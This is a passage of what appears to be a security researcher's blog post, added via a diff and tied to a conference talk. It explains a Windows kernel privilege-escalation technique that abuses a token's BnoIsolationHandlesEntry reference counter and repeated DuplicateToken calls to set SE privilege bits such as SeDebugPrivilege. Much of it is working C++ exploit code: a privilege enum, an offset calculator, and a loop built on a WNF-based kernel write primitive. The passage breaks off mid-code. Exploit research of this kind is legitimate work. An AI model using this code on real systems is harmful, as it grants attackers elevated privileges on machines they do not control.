+&lt;p&gt;As a bonus when we don’t need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt; anymore, we can simply close the handles to our duplicated tokens and it will drop our privileges again.&lt;/p&gt;
+
+&lt;h3 id=&quot;calculations&quot;&gt;Calculations&lt;/h3&gt;
+&lt;p&gt;But how many times do we need to duplicate our modified &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; and where do we have to point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN-&amp;gt;BnoIsolationHandlesEntry.ReferenceCount&lt;/code&gt; to?
+Lets first have a closer look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SE_Privileges&lt;/code&gt;. We created a struct with some of the most important &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SE_Privileges&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_PRIVS&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;unk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;unk2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeCreateTokenPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeAssignPrimaryTokenPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeLockMemoryPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeIncreaseQuotaPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeUnsolicitedInputPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeTcbPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeSecurityPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeTakeOwnershipPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeLoadDriverPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeSystemProfilePrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeSystemtimePrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeProfileSingleProcessPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeIncreaseBasePriorityPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeCreatePagefilePrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeCreatePermanentPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeBackupPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeRestorePrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeShutdownPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeDebugPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeAuditPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeSystemEnvironmentPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeChangeNotifyPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeRemoteShutdownPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeUndockPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeSyncAgentPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeEnableDelegationPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeManageVolumePrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeImpersonatePrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeCreateGlobalPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeTrustedCredManAccessPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeRelabelPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeIncreaseWorkingSetPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeTimeZonePrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeCreateSymbolicLinkPrivilege&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;SeDelegateSessionUserImpersonatePrivilege&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x24&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PRIV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The value inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PRIV&lt;/code&gt; is the bit offset which must be 1 inside the 8 byte fields of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Present&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enabled&lt;/code&gt; so the privilege can be used by the process.&lt;/p&gt;
+
+&lt;p&gt;There is only one slight problem, we have a byte precision increment and we need to flip a bit. 
+The first thing we need to know is which byte we need to increment. We called this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset&lt;/code&gt;. We can calculate this by dividing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PRIV&lt;/code&gt; by 8 with an integer division.&lt;/p&gt;
+
+&lt;p&gt;Now we need to calculate how many times we need to increment our target byte. For that we just check the last byte of our privilege and see which bit we need to flip. We named this property &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;amount&lt;/code&gt; (I know pretty genius names…):&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_PrivOffsets&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PrivOffsets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;consteval&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PrivOffsets&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CalcPrivIncrement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PRIV&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;PrivOffsets&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Please note:&lt;/strong&gt; I accidentally included a screenshot of the wrong &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset&lt;/code&gt; calculation in my BH presentation (Shame on me). I fixed it here. Sorry about that!&lt;/p&gt;
+
+&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;
+&lt;p&gt;Now lets put our new primitive to use:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;We point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token-&amp;gt;BnoIsolationHandlesEntry&lt;/code&gt; (from the token we r/w into) to our process tokens &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN.Privileges.Present&lt;/code&gt; - 0x18 + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;privs.offset&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Duplicate the controlled token for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;privs.amount&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token-&amp;gt;BnoIsolationHandlesEntry&lt;/code&gt; (from the token we r/w into) to our process tokens &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN.Privileges.Enabled&lt;/code&gt; - 0x18 + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;privs.offset&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Duplicate the controlled token for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;privs.amount&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Enjoy your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SE_Privileges&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;My code looks something like this:&lt;/p&gt;
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf_pres&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;privs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf_pres&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf_en&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;privs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf_en&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// use arbitrary increment on present (+0x40) -0x18 for the offset of the ref counter in BnoIsolationHandlesEntry&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BnoIsolationHandlesEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_token_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offsetof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_TOKEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Privileges&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offsetof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_SEP_TOKEN_PRIVILEGES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Present&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;privs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;set_res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lNtUpdateWnfStateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr_wnf_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TypeID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;privs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DuplicateToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;manipulated_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecurityAnonymous&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf_pres&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bool_result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Duplicate token failed pres&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// use arbitrary increment on enabled (+0x48) -0x18 for the offset of the ref counter in BnoIsolationHandlesEntry&lt;/span&gt;
